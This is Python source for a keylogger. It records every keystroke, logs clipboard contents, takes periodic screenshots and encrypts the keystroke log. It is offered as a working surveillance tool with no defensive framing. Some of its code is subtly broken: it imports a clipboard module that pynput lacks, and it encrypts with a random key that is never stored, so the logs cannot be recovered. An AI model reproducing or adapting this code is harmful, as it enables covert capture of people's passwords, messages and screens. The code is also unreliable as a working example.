import os
import time
import json
import base64
import logging
from threading import Timer
from pynput import keyboard, clipboard
from PIL import ImageGrab
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import scrypt

# Configuration
CONFIG_FILE = "config.json"
LOG_FILE = "keylog.txt"
ENCRYPTED_LOG_FILE = "encrypted_keylog.enc"
SCREENSHOT_DIR = "screenshots"
CLIPBOARD_LOG_FILE = "clipboard_log.txt"
ENCRYPTION_KEY = get_random_bytes(32)  # AES key must be 16, 24, or 32 bytes long

# Load configuration from JSON file
def load_config():
    if not os.path.isfile(CONFIG_FILE):
        default_config = {
            "log_interval": 60,  # Interval to save logs and screenshots (in seconds)
            "screenshot_interval": 120  # Interval to capture screenshots (in seconds)
        }
        with open(CONFIG_FILE, 'w') as file:
            json.dump(default_config, file)
    with open(CONFIG_FILE, 'r') as file:
        return json.load(file)

# Configuration settings
config = load_config()
LOG_INTERVAL = config["log_interval"]
SCREENSHOT_INTERVAL = config["screenshot_interval"]

# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to encrypt data using AES-GCM
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

# Function to save encrypted log
def save_encrypted_log():
    with open(LOG_FILE, 'r') as file:
        log_data = file.read()
    
    encrypted_data = encrypt_data(log_data, ENCRYPTION_KEY)
    with open(ENCRYPTED_LOG_FILE, 'w') as file:
        file.write(encrypted_data)
    
    # Clear the log file after encryption
    open(LOG_FILE, 'w').close()
    print("Log file encrypted and saved.")

# Function to capture screenshots
def capture_screenshot():
    if not os.path.exists(SCREENSHOT_DIR):
        os.makedirs(SCREENSHOT_DIR)
    screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{int(time.time())}.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    print(f"Screenshot saved to {screenshot_path}")

# Function to log clipboard content
def log_clipboard():
    current_clipboard = clipboard.paste()
    with open(CLIPBOARD_LOG_FILE, 'a') as file:
        file.write(f"{time.ctime()}: {current_clipboard}\n")
    print("Clipboard content logged.")

# Function to handle key press events
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special Key {key} pressed')

# Set up timers to periodically save and encrypt the log, capture screenshots, and log clipboard content
def start_timers():
    Timer(LOG_INTERVAL, start_timers).start()
    save_encrypted_log()
    
    Timer(SCREENSHOT_INTERVAL, capture_screenshot).start()
    log_clipboard()

# Main function to start the keylogger
def main():
    start_timers()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
